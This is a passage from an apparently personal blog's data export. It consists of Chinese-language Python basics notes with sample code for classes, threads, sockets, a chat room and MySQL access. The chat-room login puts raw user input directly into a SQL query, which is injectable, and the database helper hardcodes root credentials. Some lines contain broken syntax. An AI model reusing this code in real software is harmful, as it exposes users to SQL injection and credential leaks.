Demo(object):\n    pass\n\n# 如果想看到一个类提供了哪些属性，就使用 dir\nprint(dir(Demo))\n\n# 可以使用 help 查找某一个类的帮助信息\nprint(help(list))\n\n# 可以通过内置的一些属性，输出想要的内容\nprint(Demo.__dict__)内置属性的查看\n\n成员方法Python\n# 在类内测试python提供的三种成员方法\nclass Demo(object):\n\n    # 实例方法: 第一个参数表示的是调用当前方法的实例，类似 this，通常名称为\n    #   self，也可以换做其它名称(不推荐)，通过 self 可以动态操作实例属性\n    def member_function(self):\n        print(&#39;member_function&#39;)\n\n    # 类方法: 第一个参数表示当前方法所在的类，类似类名，通常名称为 cls，类\n    #   方法常用于需要访问类属性但是不访问实例属性的情况\n    @classmethod\n    def class_function(cls):\n        print(&#39;class_function&#39;)\n\n    # 静态方法: 对方法名没有任何的要求，如果方法没有访问任何的属性，就可以设为静态的\n    @staticmethod\n    def static_method():\n        print(&#39;static_method&#39;)\n\n属性限制Python\nclass Demo(object):\n    # 仅双下划线开头表示这是私有的\n    __private_value &#x3D; 1000\n\n    # __slots__ 可以限定我们能够创建什么样的属性\n    __slots__ &#x3D; (&#39;value1&#39;, &#39;value2&#39;)\n\n    # 通常双下划线开头表示私有，双下划线开头结尾表示解释器提供\n    # 单下划线开头约定俗称是私有的，但实际没有任何控制\n\n# 通过 __dict__ 属性查看当前类内的所有类属性\nprint(Demo.__dict__)\n\n# python 中的私有实际只是以一定的方式为属性修改了名称: _类名+属性名\nprint(Demo._Demo__private_value)\n\n# 创建实例并使用实例动态添加属性\ndemo &#x3D; Demo()\ndemo.value1 &#x3D; 1000\ndemo.value2 &#x3D; 1000\ndemo.value3 &#x3D; 1000\n\n\nclass Demo2(object):\n    def __init__(self, name: int, age: int):\n        self._name &#x3D; name\n        self._age &#x3D; age\n\n# 类魔术方法的重定义: __add__ __truediv__ __init__ __str__\n\n类的继承Python\n# 创建一个父类，提供了自己的属性和方法\nclass Parent(object):\n    # 父类提供的类属性\n    parent_value &#x3D; 1000\n\n    # 构造方法，父类的构造方法\n    def __init__(self, name):\n        print(f&#39;Parent.__init__(&#123;name&#125;)&#39;)\n\n\nclass Parent2(object):\n    parent_value &#x3D; 2000\n\n    def __init__(self):\n        print(f&#39;Parent2.__init__()&#39;)\n\n\n# 创建一个子类，继承自 Parent\nclass Child(Parent, Parent2):\n\n    # 如果子类没有提供构造方法，就会使用父类的构造方法\n    def __init__(self):\n        print(&#39;Child.__init__()&#39;)\n        # 不会自动调用父类的构造方法\n        Parent.__init__(self, &#39;xiaoming&#39;)\n        # 使用 super 调用父类的构造方法\n        super().__init__(&#39;xiaoming&#39;)\n\n        # 如果对 super 进行传参，那么实际调用的将是参数\n        # 一在 mro(继承) 链中的下一个类的方法\n        Parent2.__init__(self)\n        super(Parent, self).__init__()\n        super(Child, self).__init__(&#39;xiaoming&#39;)\n\n\n    # 在子类中访问父类是属性\n    def visit_value(self):\n        # 直接以类名进行访问，访问父类的属性\n        print(Parent.parent_value)\n\nchild &#x3D; Child()\nchild.visit_value()\nprint(Child.__mro__)\n\n\n#                          object(1)\n#               parent1(3)         parent2(2)\n#                child(parent1, parent2)(4)\n\n\n# python 中继承的核心就是 mro\n\n异常处理Python\ntry:\n    # 包含的是可能产生异常的语句\n    print(10 &#x2F; 1)\nexcept ZeroDivisionError:\n    # 如果产生了异常，就跳转到这个位置执行\n    print(&#39;产生了异常&#39;)\nelse:\n    # 正常情况下，所执行的代码\n    print(&#39;没有产生异常&#39;)\n\n\n# 如果接收的异常类型和实际产生的不一致，就接收不了异常\ntry:\n    print(10 &#x2F; 0)\nexcept ZeroDivisionError: #NameError:\n    print(&#39;产生了名称异常&#39;)\n\n\n# 在 python 中，产生任何一个异常都会抛出一个异常对象，\n# 通过 except type as name 的方式可以接收到异常对象\ntry:\n    l &#x3D; []\n    print(l[0])\n    # 接收到了 IndexError 异常对象并取名为 e\nexcept IndexError as e:\n    print(e)\n\n\n# 通常为了节省时间和精力会直接使用精简写法\ntry:\n    pass\n# Exception 是通用异常(语法\\网络\\文件)的基类，通过这个类型\n# 就可以接收到大多数的异常了\nexcept Exception as e:\n    pass\n\n\nimport sys\n\n\n# 通过 finally 可以保证程序无论以何种方式正常退出，其中的代码都被执行\n#   例如这些语句: return continue break sys.exit(0)\ntry:\n    if True:\n        # sys.exit(0)\n        pass\nfinally:\n    # 用于执行清理操作\n    print(&#39;finally&#39;)\n\n\n# 主动抛出异常，如果想要自定义异常，可以实现一个自己的继承自 BaseException 的异常类\n# 然后通过 raise 主动的抛出这个类型，并进行处理\npassword &#x3D; input(&#39;password: &#39;)\nif len(password) &lt; 8:\n    raise Exception(&#39;密码长度过短&#39;)\n\n文件操作Python\n# 使用 Python 内置函数完成文件操作\n\n# 参数一是文件所在的路径，参数二是打开方式，可能需要注意 encoding\nfile &#x3D; open(&#39;content.txt&#39;, &#39;w+&#39;)\n\n# 向文件的内部写入数据\nfile.write(&#39;hello 15pb&#39;)\nfile.writelines([&#39;第一行\\n&#39;, &#39;第二行\\n&#39;, &#39;第三行\\n&#39;])\n\n# 关闭文件，将对文件的修改保存到硬盘\nfile.close()\n\n# 通过 with open() as name 的形式打开一个文件\nwith open(&#39;content.txt&#39;, &#39;r&#39;) as file:\n    # 将 open 函数的返回值保存到变量 file 中\n    # 对于文件对象，在离开 with 作用域的时候\n    # 会自动的进行关闭，只需要关注逻辑部分\n    print(file.read())          # 默认读取所有内容\n    print(file.readline())      # 一行最大字符个数\n    print(file.readlines())     # 读取的最多行数\n\n# 以只读方式打开文件的时候，如果文件不存在就会产生异常\ntry:\n    with open(&#39;content2.txt&#39;) as file:\n        pass\nexcept Exception as e:\n    print(e)\n\n# 更多的函数: file.seek + file.tell -&gt; 计算文件大小\n\n# 文件操作模块: os，os 的使用方式和 C 语言的函数完全一致\n\n内置函数和模块的使用structPython\n# 通过 struct 可以实现字节流到结构体的转换\nimport struct\n\n# 打包成 int + int + char[1024] 的结构体\nbytes_content &#x3D; struct.pack(&#39;ii1024s&#39;, 10, 20, b&#39;hello15pb&#39;)\nprint(bytes_content)\n\n# 将 nt + int + char[1024] 的结构体进行解包\ntype, length, content &#x3D; struct.unpack(&#39;ii1024s&#39;, bytes_content)\nprint(type, length, content.decode(&#39;utf8&#39;).strip(&#39;\\0&#39;))\n\nfilterPython\n# filer: 将参数二指定的序列中，每一个元素都传入到参数一指定的函数中\n#   如果该函数返回为 true，就将元素保存到一个新的序列中，否则丢弃\n\n# 该函数最少需要有一个参数，用于接收序列中的每一个元素\ndef filer_function(letter):\n    # 如果是大写的，就保留，否则丢弃\n    return letter.isupper()\n\n\ndef filer_function2(value):\n    return True if value % 3 &#x3D;&#x3D; 0 else False\n\n\nprint(list(filter(filer_function, &#39;AaBbCcDdEeFfGg&#39;)))\nprint(list(filter(filer_function2, range(1000))))\n\nreducePython\nimport functools\n\n# reduce: 第一个参数是一个函数，该函数一定要接收两个参数，在使用\n#   reduce 时，第一次会将可迭代对象红的元素一和元素二传入到函数中，\n#   计算出一个返回值，接下来每次都将函数的返回结果和下一个元素进行\n#   计算，知道序列遍历结束\n\n\ndef add_value(left, right):\n    return left + right\n\ndef mul_value(left, right):\n    return left * right\n\n\n# 首先将 1 和 2 放入函数，返回 3，再将 3 和 3 计算返回 6，再将 6 和 4\n# 计算返回 10，最终一直加到 10，返回的是 10 到 1 相加的和\nprint(functools.reduce(add_value, range(1, 11)))\nprint(functools.reduce(mul_value, range(1, 11)))\n\nmapPython\n# map: 可以传入多个序列，参数一要求传入一个函数，函数接收的参数\n#   个数必须和传入的序列个数相同，在使用 map 的时候，会分别将每\n#   一个序列中的每一个元素传入函数，并且将函数的返回值组合成新\n#   的序列\n\ndef function(left, right):\n    return left* right\n\nprint(list(map(function, &#39;abcdefg&#39;, [1, 2, 3, 4, 5, 6, 7])))\n\nlambdaPython\n# lambda 表达式的语法，表达式的结果是一个匿名函数\nfunc &#x3D; lambda letter, count: letter * count\n\n# 1. 参数使用逗号隔开\n# 2. 函数体使用冒号隔开\n# 3. 函数体只能有一条语句\n# 4. 函数体内的一条语句会被作为返回值\nprint(func(&#39;a&#39;, 10))\n\n\nimport functools\n\n\n# 使用匿名函数可以在某些程度上，减少代码量\nprint(list(filter(lambda letter: letter.isupper(), &quot;AaBbCcDdEeFfGg&quot;)))\nprint(functools.reduce(lambda left, right: left * right, range(1, 11)))\nprint(functools.reduce(lambda left, right: left + right, range(1, 11)))\nprint(list(map(lambda letter, count: letter * count, &quot;abcdefg&quot;, [1, 2, 3, 4, 5, 6, 7])))\n\n线程Python\n# 使用 threading 可以实现线程操作(伪线程)\nimport threading\nimport time\n\n\n# 不带参数的线程回调函数\ndef worker_thread():\n    for i in range(1000):\n        # current_thread 表示的始终都是当前的线程\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n\n\n# 模拟主函数的使用\ndef main():\n    # 通过 Thread 函数创建一个线程，需要指定起始位置(函数)\n    t &#x3D; threading.Thread(target&#x3D;worker_thread, name&#x3D;&#39;worker_thread&#39;)\n    # Thread 创建的实际是线程对象，默认并没有运行，需要调用 start 函数\n    t.start()\n\n    for i in range(1000):\n        # current_thread 表示的始终都是当前的线程\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n\n    # 通常，为了确保主线程退出之前，所有其它线程执行完毕，需要等待\n    t.join()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\n参数传递Python\nimport threading\n\n\n# 线程回调函数，带参\ndef thread1(arg1, arg2, arg3):\n    print(arg1, type(arg1))\n    print(arg2, type(arg2))\n    print(arg3, type(arg3))\n\n\n# 线程回调函数，带元组变参\ndef thread2(*args):\n    print(args, type(args))\n\n\n# 线程回调函数，带字典变参\ndef thread3(**kwargs):\n    print(kwargs, type(kwargs))\n\n\n# 线程回调函数，带元组和字典变参\ndef thread4(*args, **kwargs):\n    print(args, type(args))\n    print(kwargs, type(kwargs))\n\n\n# 创建多个线程，传递相应的参数\nthreading.Thread(target&#x3D;thread2, args&#x3D;(1, 2, 3)).start()\nthreading.Thread(target&#x3D;thread3, kwargs&#x3D;&#123;&quot;a&quot;: 1, &quot;b&quot;: 2, &quot;c&quot;: 3&#125;).start()\nthreading.Thread(target&#x3D;thread4, args&#x3D;(1, 2, 3), kwargs&#x3D;&#123;&quot;a&quot;: 1, &quot;b&quot;: 2, &quot;c&quot;: 3&#125;).start()\nthreading.Thread(target&#x3D;thread1, args&#x3D;(1, 2, 3)).start()\n\n线程的锁Python\n# 使用 threading 可以实现线程操作(伪线程)\nimport threading\nimport time\n\n\n# 定义一个全局的锁\nlock &#x3D; threading.Lock()\n\n\n# 不带参数的线程回调函数\ndef worker_thread():\n    for i in range(1000):\n        lock.acquire()\n        # current_thread 表示的始终都是当前的线程\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n        lock.release()\n\n\n# 模拟主函数的使用\ndef main():\n    # 通过 Thread 函数创建一个线程，需要指定起始位置(函数)\n    t &#x3D; threading.Thread(target&#x3D;worker_thread, name&#x3D;&#39;worker_thread&#39;)\n    # Thread 创建的实际是线程对象，默认并没有运行，需要调用 start 函数\n    t.start()\n\n    for i in range(1000):\n        lock.acquire()\n        # current_thread 表示的始终都是当前的线程\n        print(threading.current_thread().name, i)\n        time.sleep(0.1)\n        lock.release()\n\n    # 通常，为了确保主线程退出之前，所有其它线程执行完毕，需要等待\n    t.join()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\nmap与lambda结合实现杨辉三角Python\ndef generate(numRows):\n        if numRows&#x3D;&#x3D;0:\n            return []\n        l1 &#x3D; [[1]]\n        n &#x3D; 1\n        while n&lt;numRows:\n            l1.append(map(lambda x,y:x+y, [0]+l1[-1], l1[-1]+[0]))\n            n +&#x3D; 1\n        return l1\n\n装饰器Python\n# python 中高阶函数的定义: 参数或返回值为函数的函数就是高阶函数\n\n# 闭包: 内部函数使用了外部函数的局部变量\ndef outer(left):\n    def inner(right):\n        return left * right\n    return inner\n\n\n# 将做操作数传入给函数，实际上返回的是下列函数\n&quot;&quot;&quot;\n    def inner(right):\n        return 10 * right \n&quot;&quot;&quot;\ninner &#x3D; outer(10)\n\n# 可以调用返回的函数，传入右操作数并得到结果\nprint(inner(20))\n\n\n# 装饰器: 在闭包的基础上，使用了外部传入的函数\n#   作用: 在不更改函数名称，参数个数和调用方式的前提下为某个函数添加新的功能\n\ndef w1(func):\n    def inner():\n        print(&#39;这里是新添加的内容&#39;)\n        func()\n        print(&#39;这里也是新添加的内容&#39;)\n    return inner\n\n# @w1\n# f1 是需要被装饰的函数\ndef f1():\n    print(&#39;f1&#39;)\n\nf1()\n\n\n# 装饰器实际上叫做语法糖，例如数组 arr[i][j] -&gt; *(*(arr+i)+j)\n&quot;&quot;&quot;\n    def 新的f1():\n        print(&#39;这里是新添加的内容&#39;)\n        f1() -&gt; 旧的\n        print(&#39;这里也是新添加的内容&#39;)\n&quot;&quot;&quot;\nf1 &#x3D; w1(f1)         # @w1  def f1(): ....\nf1()\n\ntime模块Python\nimport time\n\n# 获取当前的时间戳(使用浮点数记录的秒数)\nprint(time.time())\n\n# 将指定的时间戳转换为当前时区的元组\nprint(time.localtime())\nprint(time.gmtime())        # 标准时区\n\n# 将时间元组转换为时间戳\nprint(time.mktime(time.localtime()))\n\n# 睡眠一定的时间\ntime.sleep(0.500)\n\n# 将时间元组转换成时间字符串\nprint(time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time.localtime()))\n\nrandom模块Python\nimport random\n\n# randint 和 randrange\nfor i in range(100):\n    # 生成 0&lt;&#x3D;value&lt;&#x3D;10 的一个随机数值\n    print(random.randint(0, 10))\n    # 先生成一个 range 序列，从中获取一个随机值\n    print(random.randrange(0, 10))\n\n# 创建一个字符串，用于保存验证码\ntmp &#x3D; &quot;&quot;\n# 主要在于遍历的次数，循环 6 次\nfor i in range(6):\n    # 生成一个满足 range 条件的随机值\n    rad1 &#x3D; random.randrange(4)\n    # 有一半的概率进入下面的两个分支\n    if rad1 &#x3D;&#x3D; 1 or rad1 &#x3D;&#x3D; 3:\n        # 生成一个随机的整数并转换为字符串添加到末尾\n        rad2 &#x3D; random.randrange(0, 10)\n        tmp +&#x3D; str(rad2)\n    else:\n        # 生成一个随机的大小字母添加到结尾\n        rad3 &#x3D; random.randrange(65, 91)\n        tmp +&#x3D; chr(rad3)\nprint(tmp)\n\n\n# 从指定序列中随机取出一个元素\nprint(random.choice([&#39;饭&#39;, &#39;粥&#39;, &#39;面&#39;, &#39;饿&#39;]))\n\n# 打乱一个序列(洗牌)\nl &#x3D; [1, 2, 3, 4, 5, 6, 7]\nrandom.shuffle(l)\nprint(l)\n\nos模块Python\n# os 模块提供了目录和文件能够执行的一些操作\nimport os\n\nbase &#x3D; &#39;D:\\\\&#39;\n\n# 通过循环获取到指定目录下的所有文件和文件夹\nfor name in os.listdir(base):\n    # 判断目标名称是否为文件\n    if os.path.isfile(base+name):\n        # 输出文件名称以及后缀名\n        print(os.path.splitext(name))\n\n网络编程套接字服务端Python\nfrom socket import *\n\n\ndef main():\n    # 1. 创建套接字对象\n    server &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. 绑定对象到指定的ip和端口\n    server.bind((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 3. 开启套接字的监听状态\n    server.listen(SOMAXCONN)\n\n    # 4. 等待客户端的连接\n    client, address &#x3D; server.accept()\n\n    # 5. 收发数据\n    client.send(&#39;welcome&#39;.encode(&#39;utf-8&#39;))\n\n    # 6. 关闭套接字\n    client.close()\n    server.close()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\n客户端Python\nfrom socket import *\n\n\ndef main():\n    # 1. 创建套接字对象\n    client &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. 等待客户端的连接\n    client.connect((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 3. 收发数据\n    print(client.recv(100).decode(&#39;utf-8&#39;))\n\n    # 6. 关闭套接字\n    client.close()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\n聊天室(可多开)服务端Python\nfrom socket import *\nfrom struct import *\nfrom threading import *\nMysql &#x3D; __import__(&#39;数据库操作&#39;)#源码就在下一个节点\n\n\n# 提供一个列表保存所有的在线用户\nclients &#x3D; &#123;&#125;\n\n# 创建一个数据库对象，连接到 chatroom\nmysql &#x3D; Mysql.Mysql(&#39;chatroom&#39;)\n\n\n# 线程回调函数: 接收来自另一边的信息\ndef reciver(sock):\n    # 接收目标发送过来的用户名和密码 char[32] + char[32]\n    username, password &#x3D; unpack(&#39;32s32s&#39;, sock.recv(64))\n    username &#x3D; username.decode(&#39;utf-8&#39;).strip(&#39;\\0&#39;)\n    password &#x3D; password.decode(&#39;utf-8&#39;).strip(&#39;\\0&#39;)\n\n    # 查询目标用户名和密码是否匹配\n    count, result &#x3D; mysql.select(f&quot;SELECT * FROM user WHERE username&#x3D;&#39;&#123;username&#125;&#39; AND password&#x3D;MD5(&#39;&#123;password&#125;&#39;);&quot;)\n\n    # 如果登录成功，就添加到在线列表\n    if count &#x3D;&#x3D; 0:\n        sock.send(&#39;不ok&#39;.encode())\n        return\n\n    if username in clients:\n        sock.send(&#39;不ok&#39;.encode())\n        return\n    else:\n        sock.send(&#39;ok&#39;.encode())\n        clients[username] &#x3D; sock\n        print(sock.getpeername(), &#39;连接到了聊天室&#39;)\n\n    while True:\n        try:\n            # 接收客户端发送的数据，由于只是转发，不做解码\n            content &#x3D; sock.recv(100)\n            # 遍历在线用户，如果不是发送者就转发\n            for client in clients.values():\n                if client !&#x3D; sock:\n                    client.send(username.encode() + b&#39;: &#39; + content)\n        except Exception as e:\n            # print(&#39;error&#39;, e)\n            # 客户端或服务器连接中断，需要从列表中移除\n            print(sock.getpeername(), &#39;离开了聊天室&#39;)\n            del clients[username]\n            # 一定要记得 break 跳出当前的循环\n            break\n\n\ndef main():\n    # 1. 创建套接字对象\n    server &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. 绑定对象到指定的ip和端口\n    server.bind((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 3. 开启套接字的监听状态\n    server.listen(SOMAXCONN)\n\n    while True:\n        # 4. 等待客户端的连接\n        client, address &#x3D; server.accept()\n\n        # 5. 收发数据\n        Thread(target&#x3D;reciver, args&#x3D;(client,)).start()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\n客户端Python\nfrom socket import *\nfrom struct import *\nfrom threading import *\n\n\n# 线程回调函数: 接收来自另一边的信息\ndef reciver(sock):\n    while True:\n        try:\n            # 如果客户端或服务器断开连接，会产生异常\n            print(sock.recv(100).decode(&#39;utf-8&#39;))\n        except Exception as e:\n            print(&#39;error&#39;, e)\n            # 一定要记得 break 跳出当前的循环\n            break\n\n\ndef main():\n    # 1. 创建套接字对象\n    client &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. 等待客户端的连接\n    client.connect((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 填写用户名和密码尝试进行登录\n    username &#x3D; input(&#39;username: &#39;)\n    password &#x3D; input(&#39;password: &#39;)\n    content &#x3D; pack(&#39;32s32s&#39;, username.encode(), password.encode())\n    client.send(content)\n\n    # 接收登录的结果，如果失败，就退出\n    if client.recv(100).decode() &#x3D;&#x3D; &#39;不ok&#39;:\n        return\n    print(&#39;xxxxxxx&#39;)\n\n    # 3. 收发数据\n    Thread(target&#x3D;reciver, args&#x3D;(client, )).start()\n    while True:\n        content &#x3D; input(&#39;&#39;)\n        if content &#x3D;&#x3D; &#39;quit&#39;:\n            break\n        else:\n            client.send(content.encode())\n\n    # 6. 关闭套接字\n    client.close()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\n数据库操作Python\n# 通过 pymysql 连接并操作 mysql 数据库\nimport pymysql\n\n\nclass Mysql(object):\n\n    def __init__(self, database_name):\n        try:\n            # 通过 connect 函数传入数据库的配置信息连接到数据库\n            self.connect &#x3D; pymysql.connect(host&#x3D;&#39;127.0.0.1&#39;, user&#x3D;&#39;root&#39;, password&#x3D;&#39;123456&#39;, port&#x3D;3306, database&#x3D;database_name)\n            # 一旦数据库连接成功，我们就需要获取到游标对象\n            self.cursor &#x3D; self.connect.cursor()#获取操作游标\n        except Exception as e:\n            print(&#39;error&#39;, e)\n\n    def insert(self, sql: str):\n        try:\n            # execute执行sql语句\n            self.cursor.execute(sql)\n            # 对于所有修改数据库的操作，都需要提交\n            self.connect.commit()\n        except Exception as e:\n            #回滚操作\n            self.connect.rollback()\n            print(&#39;error&#39;, e)\n\n    def select(self, sql: str):\n        try:\n            self.cursor.execute(sql)\n            # 从数据库中获取到查询的结果集，返回的是一个元组，\n            # 元组中的每一个元素表示一行，保存的是一行中的每一列\n            result &#x3D; self.cursor.fetchall()&#x2F;#获取所有内容\n            count &#x3D; self.cursor.rowcount&#x2F;#获取行数\n            # 将查询到的行数和内容进行打包，返回给调用方\n            return count, result\n        except Exception as e:\n            print(&#39;error&#39;, e)\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    sql &#x3D; Mysql(&#39;student&#39;)\n    sql.insert(&quot;INSERT INTO stu_class VALUE(10, &#39;ten&#39;)&quot;)\n    print(sql.select(&#39;select * from stu_class;&#39;))\n\n小功能实现阶乘Code\ndef Get_Num(Num):\n    j &#x3D; 0\n    for b in range(1, Num+1):\n        i &#x3D; 1\n        for c in range(1, b+1):\n                i *&#x3D;c\n                #print(i)\n        j +&#x3D; i\n    return j\n    \nprint(Get_Num(5))\n\n水仙花数Python\n&#39;&#39;&#39;水仙花数&#39;&#39;&#39;\n\nNum &#x3D; 100\n\nwhile Num &lt; 1000:\n    if Num &#x3D;&#x3D; (Num&#x2F;&#x2F;100 % 10) **3 + (Num&#x2F;&#x2F;10 % 10) **3 + (Num&#x2F;&#x2F;1 % 10)**3:\n        print(Num)\n    Num +&#x3D;1\n\n三角图形Code\n打印如下图形\n\n               *\n              ***\n             *****\n            *******\n\n方法1Python\nfor i in range(4):\n    print(&quot; &quot;*(4-i),&quot;*&quot;*(2*i+1))\n\n方法2Python\nnum &#x3D; 1\nnum2 &#x3D; 4\nnum3 &#x3D; 4\nwhile num &lt;&#x3D; 4:\n    num1 &#x3D; 1\n    while num1 &lt;&#x3D; 7:\n        if num1 &gt;&#x3D; num2 and num1 &lt;&#x3D;num3:\n            print(&#39;*&#39;, end&#x3D;&#39;&#39;)\n        else:\n            print(&#39; &#39;, end&#x3D;&#39;&#39;)\n        num1 +&#x3D; 1\n    num2 -&#x3D; 1\n    num3 +&#x3D; 1\n    print(&#39;&#39;)\n    num +&#x3D; 1\n\n菱形Code\n打印如下图型\n               *\n              ***\n             *****\n            *******\n             *****\n              ***\n               *\nPython\nnum &#x3D; 1\nnum2 &#x3D; 4\nnum3 &#x3D; 4\nwhile num &lt;&#x3D; 7:\n    num1 &#x3D; 1\n    while num1 &lt;&#x3D; 7:\n        if num1 &gt;&#x3D; num2 and num1 &lt;&#x3D;num3:\n            print(&#39;*&#39;, end&#x3D;&#39;&#39;)\n        else:\n            print(&#39; &#39;, end&#x3D;&#39;&#39;)\n        num1 +&#x3D; 1\n    if num &lt; 4:\n        num2 -&#x3D; 1\n        num3 +&#x3D; 1\n    else:\n        num2 +&#x3D; 1\n        num3 -&#x3D; 1\n    print(&#39;&#39;)\n    num +&#x3D; 1\n\n空菱形Code\n   打印如下图型\n   *\n  * *\n *   *\n*     *\n *   *\n  * *\n   *\nPython\nnum &#x3D; 1\nnum2 &#x3D; 4\nnum3 &#x3D; 4\nwhile num &lt;&#x3D; 7:\n    num1 &#x3D; 1\n    while num1 &lt;&#x3D; 7:\n        if num1 &#x3D;&#x3D; num2 or num1 &#x3D;&#x3D;num3:\n            print(&#39;*&#39;, end&#x3D;&#39;&#39;)\n        else:\n            print(&#39; &#39;, end&#x3D;&#39;&#39;)\n        num1 +&#x3D; 1\n    if num &lt; 4:\n        num2 -&#x3D; 1\n        num3 +&#x3D; 1\n    else:\n        num2 +&#x3D; 1\n        num3 -&#x3D; 1\n    print(&#39;&#39;)\n    num +&#x3D; 1\n\n冒泡排序Python\n&#39;&#39;&#39;冒泡排序&#39;&#39;&#39;\nList &#x3D; [20, 30, 40, 3, 6, 47, 25, 77, 15]\n\nNum &#x3D; 0\ntemp &#x3D; 0\nlenth &#x3D;  len(List) - 1\nwhile Num &lt;&#x3D; lenth-1:\n    for i in range(len(List)):\n        if i &lt; lenth:\n            if List[i] &gt; List[i+1]:\n                temp &#x3D; List[i]\n                List[i] &#x3D; List[i+1]\n                List[i+1] &#x3D; temp\n    Num +&#x3D; 1\nprint(List)\n\n杨辉三角方法1Python\ndef generate(numRows):\n        if numRows&#x3D;&#x3D;0:\n            return []\n        l1 &#x3D; [[1]]\n        n &#x3D; 1\n        while n&lt;numRows:\n            l1.append(map(lambda x,y:x+y, [0]+l1[-1], l1[-1]+[0]))\n            n +&#x3D; 1\n        return l1\n\n方法2Python\n#杨辉三角\ndef generate(numRows):\n        if numRows&#x3D;&#x3D;0:\n            return []\n        if numRows&#x3D;&#x3D;1:\n            return[[1]]\n        if numRows&#x3D;&#x3D;2:\n            return [[1],[1,1]]\n        numRows -&#x3D; 2\n        rList &#x3D; [[1],[1,1]]\n        while numRows&gt;0:\n            newList &#x3D; [1]\n            for i in range(len(rList[-1])-1):\n                newList.append(rList[-1][i]+rList[-1][i+1])\n            newList.append(1)\n            rList.append(newList)\n            numRows -&#x3D; 1\n        return rList\n\n方法3Python\ndef Yhsj(row):\n    result &#x3D; [1]\n    n &#x3D; 0\n    while n &lt; row:\n        if n &lt; 1:\n            yield result\n        else:\n            a &#x3D; 1\n            t &#x3D; tuple(x for x in result)\n            result &#x3D; [1, 1]\n            while a &lt; n:\n                result.insert(a, t[a - 1] + t[a])\n                a +&#x3D; 1\n            yield result\n        n +&#x3D; 1\n\n方法4Python\ndef generate(self, numRows):\n        &quot;&quot;&quot;\n        :type numRows: int\n        :rtype: List[List[int]]\n        &quot;&quot;&quot;\n        l1 &#x3D; [1]\n        l2 &#x3D; []\n        n &#x3D; 0\n        while n&lt;numRows:\n            l2.append(l1)\n            l1 &#x3D; [sum(t) for t in zip([0]+l1, l1+[0])]\n            n +&#x3D; 1\n        return l2\n\n方法5Python\ndef generate(self, numRows):\n        &quot;&quot;&quot;\n        :type numRows: int\n        :rtype: List[List[int]]\n        &quot;&quot;&quot;\n        if numRows&#x3D;&#x3D;0:\n            return []\n        if numRows&#x3D;&#x3D;1:\n            return[[1]]\n        if numRows&#x3D;&#x3D;2:\n            return [[1],[1,1]]\n        numRows -&#x3D; 2\n        rList &#x3D; [[1],[1,1]]\n        while numRows&gt;0:\n            newList &#x3D; [1]\n            for i in range(len(rList[-1])-1):\n                newList.append(rList[-1][i]+rList[-1][i+1])\n            newList.append(1)\n            rList.append(newList)\n            numRows -&#x3D; 1\n        return rList\n\n方法6Python\ndef Yanghui():\n    n &#x3D; [1]\n    while True:\n        yield n\n        n.append(0)\n        n &#x3D; [n[i] + n[i-1] for i in range(len(n))]\n\ndef fun(n):\n    for i in Yanghui():\n        print(i)\n        n -&#x3D; 1\n        if n &#x3D;&#x3D; 0:\n            break\n            \n            \n            \nfun(10)\n\n\n\n\n\n\n\n\n\n\n粗略的写一下，后面补上\n","slug":"python基础","date":"2020-11-24T03:30:44.000Z","categories_index":"Python基础","tags_index":"Python基础","author_index":"Akpigs"},{"id":"57d886b036cac1f1f4453ef4a9cee3e6","title":"C/C++那些事","content":"C&#x2F;C++教程本阶段主要针对C++&#x3D;&#x3D;面向对象&#x3D;&#x3D;编程技术做详细讲解，探讨C++中的核心和精髓。\n内存分区模型C++程序在执行时，将内存大方向划分为4个区域\n\n代码区：存放函数体的二进制代码，由操作系统进行管理的\n全局区：存放全局变量和静态变量以及常量\n栈区：由编译器自动分配释放, 存放函数的参数值,局部变量等\n堆区：由程序员分配和释放,若程序员不释放,程序结束时由操作系统回收\n\n内存四区意义：\n不同区域存放的数据，赋予不同的生命周期, 给我们更大的灵活编程\n程序运行前在程序编译后，生成了exe可执行程序，未执行该程序前分为两个区域\n代码区：\n存放 CPU 执行的机器指令\n代码区是共享的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可\n代码区是只读的，使其只读的原因是防止程序意外地修改了它的指令\n全局区：\n全局变量和静态变量存放在此.\n全局区还包含了常量区, 字符串常量和其他常量也存放在此.\n&#x3D;&#x3D;该区域的数据在程序结束后由操作系统释放&#x3D;&#x3D;.\n示例：\n&#x2F;&#x2F;全局变量\nint g_a &#x3D; 10;\nint g_b &#x3D; 10;\n\n&#x2F;&#x2F;全局常量\nconst int c_g_a &#x3D; 10;\nconst int c_g_b &#x3D; 10;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;局部变量\n\tint a &#x3D; 10;\n\tint b &#x3D; 10;\n\n\t&#x2F;&#x2F;打印地址\n\tcout &lt;&lt; &quot;局部变量a地址为： &quot; &lt;&lt; (int)&amp;a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;局部变量b地址为： &quot; &lt;&lt; (int)&amp;b &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;全局变量g_a地址为： &quot; &lt;&lt;  (int)&amp;g_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;全局变量g_b地址为： &quot; &lt;&lt;  (int)&amp;g_b &lt;&lt; endl;\n\n\t&#x2F;&#x2F;静态变量\n\tstatic int s_a &#x3D; 10;\n\tstatic int s_b &#x3D; 10;\n\n\tcout &lt;&lt; &quot;静态变量s_a地址为： &quot; &lt;&lt; (int)&amp;s_a &lt;&lt; endl;\n\tcout 